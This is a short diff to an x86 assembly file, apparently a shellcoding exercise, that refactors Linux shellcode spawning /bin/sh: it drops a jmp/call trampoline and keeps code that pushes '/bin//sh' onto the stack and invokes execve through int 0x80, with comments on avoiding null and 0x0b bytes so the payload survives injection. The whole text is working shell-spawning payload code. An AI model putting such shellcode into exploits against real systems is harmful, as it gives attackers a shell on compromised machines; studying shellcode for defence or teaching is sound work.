@@ -3,9 +3,6 @@ global _start
 section .text
 
 _start:
-jmp message
-
-proc:
     xor eax, eax; safe null
     push eax; push null byte onto stack
     push 0x68732f2f ; push /bin//sh
@@ -16,8 +13,5 @@ proc:
     mov al, 5 ; set sys_execve & and avoid 0x0b byte
     add al, 6
     int 0x80 ; trigger interrupt
-
-message:
-    call proc
 
 section .data
